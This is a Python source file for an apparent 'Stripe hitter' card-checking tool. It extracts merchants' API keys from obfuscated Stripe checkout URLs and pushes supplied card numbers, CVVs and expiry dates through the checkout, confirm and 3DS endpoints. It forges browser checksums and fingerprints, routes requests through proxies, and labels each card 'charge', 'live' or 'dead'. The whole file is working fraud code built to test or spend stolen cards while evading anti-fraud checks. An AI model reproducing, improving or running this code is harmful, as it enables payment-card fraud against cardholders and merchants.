import aiohttp
import asyncio
import random
import re
import json
import base64
from urllib.parse import quote, unquote

class StripeHitter:
    def __init__(self, proxy=None):
        self.proxy = proxy
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
        self.headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": self.ua,
            "Origin": "https://checkout.stripe.com",
            "Referer": "https://checkout.stripe.com/"
        }

    def xor_encode(self, plaintext):
        key = [5]
        ciphertext = ""
        for i in range(len(plaintext)):
            ciphertext += chr(ord(plaintext[i]) ^ key[i % len(key)])
        return ciphertext

    def get_js_encoded_string(self, pm_id):
        # Port of get_js_encoded_string from functions.php
        pm_suffix = "".join(random.choice("0123456789abcdef") for _ in range(4))
        pm_json = f'{{"id":"{pm_id}{pm_suffix}"}}'
        pm_xor = self.xor_encode(pm_json)
        pm_b64 = base64.b64encode(pm_xor.encode('latin-1')).decode('ascii')
        return pm_b64.replace("/", "%2F").replace("+", "%2B") + "eCUl"

    async def grab_keys(self, checkout_url):
        """Advanced extraction of PK and CS from checkout hash, including payment details."""
        try:
            parts = checkout_url.split('#')
            if len(parts) < 2: return None
            
            checkout_id = parts[0].split('/')[-1]
            hash_str = unquote(parts[1])
            
            # De-obfuscate hash (XOR 5)
            decoded_hash = base64.b64decode(hash_str)
            decrypted = "".join(chr(5 ^ b) for b in decoded_hash)
            data = json.loads(decrypted)
            
            pk = data.get('apiKey')
            if not pk: return None
            
            # 1. INIT call to get amount, currency, and email
            # This mimics the init call in stripecheckout.php
            headers = {
                "User-Agent": self.ua,
                "Origin": "https://checkout.stripe.com",
                "Referer": "https://checkout.stripe.com/",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            
            init_url = f"https://api.stripe.com/v1/payment_pages/{checkout_id}/init"
            init_data = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
            
            async with aiohttp.ClientSession() as session:
                async with session.post(init_url, headers=headers, data=init_data, proxy=self.proxy) as resp:
                    res = await resp.json()
                    if "error" in res:
                        # Fallback to defaults if init fails but we have keys
                        return {"pk": pk, "cs": checkout_id, "amount": 100, "currency": "usd", "email": "user@gmail.com"}
                    
                    amount = res.get('line_item_group', {}).get('total') or res.get('invoice', {}).get('total') or 100
                    currency = res.get('currency', 'usd')
                    email = res.get('customer', {}).get('email') or res.get('customer_email') or f"user{random.randint(1000, 9999)}@gmail.com"
                    
                    return {
                        "pk": pk,
                        "cs": checkout_id,
                        "amount": amount,
                        "currency": currency,
                        "email": email
                    }
        except Exception as e:
            print(f"Key Grabber Error: {e}")
            return None

    async def hit_checkout(self, card, month, year, cvv, pk, cs, amount=None, currency="usd", email=None):
        if len(year) == 2: year = "20" + year
        month = month.zfill(2)
        
        if not email:
            email = f"user{random.randint(1000, 9999)}@gmail.com"
            
        # Fingerprinting parameters from stripecheckout.php
        browser_locale = "en-US"
        stripe_tag = f"stripe.js/{random.choice('0123456789abcdef')*10}; stripe-js-v3/{random.choice('0123456789abcdef')*10}; checkout"
        tz = random.choice(['-300', '-360', '-420', '-480', '-240', '0', '60'])
        color_depth = random.choice(['24', '30', '32'])
        screen_height = random.choice(['864', '1080', '1440'])
        screen_width = random.choice(['1536', '1920', '2560'])

        async with aiohttp.ClientSession() as session:
            try:
                # 1. INIT
                init_url = f"https://api.stripe.com/v1/payment_pages/{cs}/init"
                init_data = f"key={pk}&eid=NA&browser_locale={browser_locale}&redirect_type=url"
                async with session.post(init_url, headers=self.headers, data=init_data, proxy=self.proxy) as resp:
                    init_res = await resp.json()
                    if "error" in init_res:
                        return {"status": "dead", "response": init_res['error']['message'], "gate": "Stripe Hitter"}
                    init_checksum = init_res['init_checksum']
                    merchant = init_res.get('account_settings', {}).get('display_name', 'Unknown')
                    if not amount:
                        amount = init_res.get('line_item_group', {}).get('total') or init_res.get('invoice', {}).get('total', 100)
                        currency = init_res.get('currency', 'usd')

                # 2. CREATE PAYMENT METHOD
                pm_url = "https://api.stripe.com/v1/payment_methods"
                pm_data = {
                    "type": "card",
                    "card[number]": card,
                    "card[cvc]": cvv,
                    "card[exp_month]": month,
                    "card[exp_year]": year,
                    "billing_details[address][country]": "US",
                    "billing_details[email]": email,
                    "key": pk,
                    "payment_user_agent": stripe_tag
                }
                async with session.post(pm_url, headers=self.headers, data=pm_data, proxy=self.proxy) as resp:
                    pm_res = await resp.json()
                    if "error" in pm_res:
                        return {"status": "dead", "response": pm_res['error']['message'], "gate": "Stripe Hitter"}
                    pm_id = pm_res['id']

                # 3. CONFIRM
                confirm_url = f"https://api.stripe.com/v1/payment_pages/{cs}/confirm"
                js_checksum = self.get_js_encoded_string(pm_id)
                confirm_data = {
                    "eid": "NA",
                    "payment_method": pm_id,
                    "expected_amount": amount,
                    "expected_payment_method_type": "card",
                    "key": pk,
                    "init_checksum": init_checksum,
                    "js_checksum": js_checksum
                }
                async with session.post(confirm_url, headers=self.headers, data=confirm_data, proxy=self.proxy) as resp:
                    confirm_res = await resp.json()
                    
                    if "error" in confirm_res:
                        return {"status": "dead", "response": confirm_res['error']['message'], "gate": "Stripe Hitter"}
                    
                    if confirm_res.get('status') == "succeeded":
                        return {"status": "charge", "response": "Payment Successful 🔥", "gate": "Stripe Hitter", "amount": amount, "currency": currency, "merchant": merchant}

                    # Check for 3DS
                    pay_att = confirm_res.get('payment_intent', {}).get('next_action', {}).get('use_stripe_sdk', {}).get('three_d_secure_2_source')
                    if not pay_att:
                        return {"status": "dead", "response": "Declined", "gate": "Stripe Hitter"}

                    server_trans = confirm_res.get('payment_intent', {}).get('next_action', {}).get('use_stripe_sdk', {}).get('server_transaction_id', '')
                    enc_server = base64.b64encode(f'{{"threeDSServerTransID":"{server_trans}"}}'.encode()).decode()
                    pi_id = confirm_res.get('payment_intent', {}).get('id')
                    client_secret = confirm_res.get('payment_intent', {}).get('client_secret')

                    # 4. 3DS AUTHENTICATE
                    auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
                    auth_data = {
                        "source": pay_att,
                        "browser": json.dumps({
                            "fingerprintAttempted": True,
                            "fingerprintData": enc_server,
                            "challengeWindowSize": None,
                            "threeDSCompInd": "Y",
                            "browserJavaEnabled": False,
                            "browserJavascriptEnabled": True,
                            "browserLanguage": "en-US",
                            "browserColorDepth": color_depth,
                            "browserScreenHeight": screen_height,
                            "browserScreenWidth": screen_width,
                            "browserTZ": tz,
                            "browserUserAgent": self.ua
                        }),
                        "key": pk
                    }
                    async with session.post(auth_url, headers=self.headers, data=auth_data, proxy=self.proxy) as resp:
                        auth_res = await resp.json()
                        if auth_res.get('state') == 'challenge_required':
                            return {"status": "live", "response": "3DS Challenge Required (OTP) 🔒", "gate": "Stripe Hitter"}

                    # 5. FINAL PI CHECK
                    pi_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}?key={pk}&is_stripe_sdk=false&client_secret={client_secret}"
                    async with session.get(pi_url, headers=self.headers, proxy=self.proxy) as resp:
                        final_res = await resp.json()
                        status = final_res.get('status')
                        if status == "succeeded":
                            return {"status": "charge", "response": "Payment Successful 🔥", "gate": "Stripe Hitter", "amount": amount, "currency": currency, "merchant": merchant}
                        if "insufficient_funds" in str(final_res):
                            return {"status": "live", "response": "Insufficient Funds ✅", "gate": "Stripe Hitter"}
                        
                        return {"status": "dead", "response": "Declined", "gate": "Stripe Hitter"}

            except Exception as e:
                return {"status": "error", "response": str(e), "gate": "Stripe Hitter"}
